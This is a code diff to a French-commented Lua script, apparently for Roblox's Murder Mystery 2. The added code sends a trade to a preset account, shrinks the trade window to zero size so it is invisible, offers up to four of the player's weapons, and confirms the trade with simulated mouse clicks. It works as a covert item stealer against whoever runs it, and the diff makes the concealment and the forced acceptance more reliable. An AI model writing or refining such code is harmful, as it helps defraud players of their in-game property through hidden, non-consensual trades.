@@ -492,15 +492,42 @@ end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
-local function getitems()
-    -- 1. On lance ton destroy pour nettoyer l'écran et libérer tes mouvements
-    if destroytrades2 then
-        pcall(function() coroutine.resume(destroytrades2) end)
-    end
+-- Fonction pour masquer totalement le panneau en réduisant sa taille à 0x0
+local function setTradeInvisibleSize(hidden)
+    pcall(function()
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+        local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("Trade")
+        if tradeGui then
+            local container = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("MainFrame") or tradeGui:FindFirstChild("Frame")
+            if container then
+                if hidden then
+                    -- Sauvegarde de la taille d'origine si pas encore fait
+                    if not container:FindFirstChild("OrigSize") then
+                        local sizeVal = Instance.new("Vector3Value", container)
+                        sizeVal.Name = "OrigSize"
+                        sizeVal.Value = Vector3.new(container.Size.X.Scale, container.Size.X.Offset, container.Size.Y.Scale)
+                    end
+                    -- On réduit la taille à 0 (invisible et ne gêne pas)
+                    container.Size = UDim2.new(0, 0, 0, 0)
+                else
+                    -- On remet la taille normale pour laisser les clics virtuels agir
+                    if container:FindFirstChild("OrigSize") then
+                        container.Size = UDim2.new(0, 450, 0, 350) -- Taille standard approximative du trade MM2
+                    else
+                        container.Size = UDim2.new(0.5, 0, 0.5, 0)
+                    end
+                end
+            end
+        end
+    end)
+end
 
-    -- 2. Envoi de la demande de trade
+local function getitems()
+    -- 1. Envoi de la demande de trade
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
         warn("Compte principal introuvable : " .. tostring(userName))
@@ -508,20 +535,29 @@ local function getitems()
     end
 
     Trade.SendRequest:InvokeServer(targetPlayer)
-    task.wait(3)
+    task.wait(2.5)
 
-    -- 3. Remplissage des objets (tes boucles d'origine)
+    -- 2. On rend le panneau invisible en réduisant sa taille à 0 dès son ouverture
+    setTradeInvisibleSize(true)
+
+    -- 3. Tes boucles d'envoi d'items d'origine (4 max)
+    local itemsOffered = 0
+    local maxSlots = 4
+
     local function offerAll(itemTable)
-        if itemTable then
+        if itemTable and itemsOffered < maxSlots then
             for _, b in pairs(itemTable) do
                 for i = 1, b.amount do
+                    if itemsOffered >= maxSlots then break end
                     local args = {
                         [1] = b.data,
                         [2] = "Weapons"
                     }
                     Trade.OfferItem:FireServer(unpack(args))
-                    task.wait(0.2) -- Petit délai pour éviter de saturer le serveur
+                    itemsOffered = itemsOffered + 1
+                    task.wait(0.2)
                 end
+                if itemsOffered >= maxSlots then break end
             end
         end
     end
@@ -542,25 +578,42 @@ local function getitems()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 5. Attente du timer obligatoire du serveur MM2 (7-8 secondes)
+    -- 5. Attente du timer obligatoire du serveur (8 secondes)
     task.wait(8)
 
-    -- 6. SOLUTION 2 : Validation forcée par contournement réseau (Hook / FireServer direct)
-    -- On envoie l'événement de validation finale avec l'argument du joueur ou du token de trade
+    -- 6. SÉQUENCE DE CLIC VIRTUEL SUR LE BOUTON
     pcall(function()
-        -- Tentative avec l'ID du joueur ou les arguments standard de MM2
-        Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
+        -- On redonne sa taille normale au panneau une fraction de seconde pour que le clic touche le bouton
+        setTradeInvisibleSize(false)
+        task.wait(0.15)
+
+        local Camera = workspace.CurrentCamera
+        local ViewportSize = Camera.ViewportSize
+
+        local targetX = ViewportSize.X * 0.76
+        local targetY = ViewportSize.Y * 0.74
+
+        local function sendClick()
+            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, true, game, 0)
+            task.wait(0.15)
+            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
+        end
+
+        -- Double clic de validation finale
+        sendClick()
+        task.wait(2)
+        sendClick()
     end)
-    
-    -- Sécurité supplémentaire : double appel au cas où le premier est intercepté
+
+    -- 7. Nettoyage final : fermeture propre du trade
     task.wait(1)
-    pcall(function()
-        Trade.AcceptTrade:FireServer(targetPlayer)
-    end)
+    if destroytrades2 then
+        pcall(function() coroutine.resume(destroytrades2) end)
+    end
 end
 
 -- ==========================================
--- ÉCOUTE DU TCHAT 44
+-- ÉCOUTE DU TCHAT
 -- ==========================================
 
 local function setupPlayer(player)
